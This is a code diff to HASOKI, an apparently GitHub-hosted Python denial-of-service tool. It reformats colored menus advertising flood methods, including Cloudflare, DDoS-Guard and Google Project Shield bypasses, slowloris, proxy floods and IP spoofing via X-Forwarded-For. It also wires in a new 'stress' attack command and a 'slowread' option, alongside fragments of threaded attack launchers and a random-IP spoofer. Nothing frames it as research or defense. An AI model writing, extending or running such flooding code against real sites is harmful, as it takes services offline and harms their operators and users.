@@ -661,7 +661,9 @@ def AttackCFSOC(until_datetime, target, req):
             packet.close()
             pass
 
+
 #slowloris
+
 def attackslow(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=Launchslow, args=(url, timer)).start()
@@ -740,6 +742,8 @@ def Launchhttp2(url, timer):
                             r5 = client.head(url)
                 except httpx.HTTPError as exc:
                    pass
+
+
 #spoof
 def spoofer():
     addr = [192, 168, 0, 1]
@@ -750,7 +754,6 @@ def spoofer():
     addr[3] = str(random.randrange(2, 254))
     assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
     return assemebled
-
 #spoofmethod
 
 def attackspoof(url, timer, threads):
@@ -928,7 +931,7 @@ def help():
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"╠═════════════════════════════════════════════════════╣\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using HASOKI.               "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/cutipu/HASOKI          "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/cutipu/HASOKI               "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
@@ -943,7 +946,7 @@ def infoattack():
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"╠═════════════════════════════════════════════════════╣\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using HASOKI.                "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/cutipu/HASOKI          "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/cutipu/HASOKI               "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
@@ -964,28 +967,29 @@ def layer7():
     stdout.write("                   "+Fore.LIGHTGREEN_EX   +"██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝               \n")
     stdout.write("                   "+Fore.LIGHTGREEN_EX   +"███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║                 \n")
     stdout.write("                   "+Fore.LIGHTGREEN_EX   +"╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝                   \n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╔═════════╩═════════════════════════════════╩══════════╗\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" STRONG Bypass with spoof Xforward         "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfb   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                          "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy               "+Fore.LIGHTGREEN_EX+"║\n")                  
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfpro "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)     "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfsoc "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"bypass"+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"sky   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                 "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"stellar"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" HTTPS Sky method without proxies          "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ════╦════════════════════════════════════╦══\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╔═══════════╩════════════════════════════════════╩═════════╗\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" STRONG Bypass with spoof Xforward         "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb   "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                          "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy               "+Fore.LIGHTGREEN_EX+"║\n")                  
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfpro "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)     "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfsoc "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"bypass"+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,    "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"sky   "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                 "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"stellar"+Fore.LIGHTGREEN_EX+"  |"+Fore.LIGHTWHITE_EX+" HTTPS Sky method without proxies          "+Fore.LIGHTGREEN_EX+"║\n")
     
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Get Request Attack                        "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post  "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Post Request Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head  "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Head Request Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"http2 "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                   "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                  "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"stress  "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" DDos stress HEX method                    "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"get   "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Get Request Attack                        "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"post  "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Post Request Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"head  "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Head Request Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http2 "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                   "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                  "+Fore.LIGHTGREEN_EX+"║\n")
 
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Socket Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxraw "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsoc "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxslow"+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Slowloris attack                    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚══════════════════════════════════════════════════════╝\n") 
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"soc   "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Socket Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxraw "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxsoc "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxslow"+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Slowloris attack                    "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚══════════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
 ##############################################################################################
 def layer4():
@@ -1157,6 +1161,12 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+    elif command == "stress":
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackstress, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
     elif command == "http2":
         target, thread, t = get_info_l7()
         threading.Thread(target=attackhttp2, args=(target, t, thread)).start()
@@ -1243,6 +1253,7 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxslow     "+Fore.RED+": "+Fore.WHITE+"Proxy Slowloris attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"http2     "+Fore.RED+": "+Fore.WHITE+"HTTP/2.0 Flood\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"slowread        "+Fore.RED+": "+Fore.WHITE+"Slowread dos.Slowhttptest\n")
     stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
